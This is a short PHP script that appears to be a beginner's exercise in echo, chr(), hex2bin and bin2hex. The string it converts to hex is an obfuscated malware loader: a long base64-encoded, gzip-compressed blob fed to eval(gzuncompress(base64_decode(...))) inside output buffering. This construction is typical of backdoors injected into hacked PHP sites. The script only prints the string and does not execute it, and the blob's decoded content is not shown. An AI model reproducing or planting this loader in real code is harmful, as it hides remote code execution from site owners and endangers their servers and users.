<?php

$imie="Mirek";
echo $imie."<br>";

echo "Ascii: \x4d \77 ;";

$ascii=0;
while ($ascii < 300) {
	echo chr($ascii);
    $ascii++;
}
echo "<br>hex2bin:<br>";
$hex = hex2bin("6578616d706c65206865782064617461");
var_dump($hex);

echo "<br>Bin2Heex:<br>";
$bin = bin2hex("ob_start();$a='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';eval(gzuncompress(base64_decode($a)));$v=ob_get_contents();ob_end_clean();");
var_dump($bin);

echo "<br>hex2bin:<br>";
$hex=hex2bin("$bin");
echo $hex;


?>
